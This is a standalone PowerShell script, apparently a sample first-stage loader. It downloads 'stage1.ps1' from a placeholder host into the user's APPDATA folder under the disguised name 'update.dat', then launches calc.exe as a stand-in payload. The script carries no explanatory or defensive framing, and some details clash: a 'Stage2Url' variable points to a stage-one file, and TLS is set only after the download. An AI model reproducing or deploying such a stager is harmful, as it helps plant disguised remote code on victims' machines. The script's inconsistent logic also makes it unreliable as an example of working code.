[CmdletBinding()]
param(
    [string]$Stage2Url = "http://example.net/stage1.ps1",
    [string]$OutputPath = "$env:APPDATA\update.dat",
    [int]$RequestTimeout = 177
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$OperationResult = Get-Stage1Payload -SourceUrl $Stage2Url -DestinationPath $OutputPath -TimeoutSec $RequestTimeout
if ($OperationResult) {
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
}
Write-Verbose "stage marker 6 reached"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
